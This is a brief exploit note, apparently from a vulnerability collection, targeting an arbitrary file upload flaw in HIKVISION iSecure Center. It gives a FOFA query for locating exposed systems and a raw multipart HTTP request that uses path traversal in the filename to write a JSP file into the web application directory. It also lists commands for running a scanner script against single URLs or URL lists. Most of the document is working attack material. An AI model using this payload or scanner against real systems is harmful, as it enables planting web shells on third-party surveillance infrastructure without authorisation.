fofa

```markdown
app="HIKVISION-iSecure-Center"
```

payload

```markdown
POST /center/api/files;.html HTTP/1.1
Host: 10.10.10.10
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary9PggsiM755PLa54a

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../../../../../../../../../opt/hikvision/web/components/tomcat85linux64.1/webapps/eportal/new.jsp"
Content-Type: application/zip

hello，world
------WebKitFormBoundary9PggsiM755PLa54a--
```

命令

```markdown
python3 海康威视isecure center 综合安防管理平台存在任意文件上传漏洞.py -u url
python3 海康威视isecure center 综合安防管理平台存在任意文件上传漏洞.py -f url.txt
```

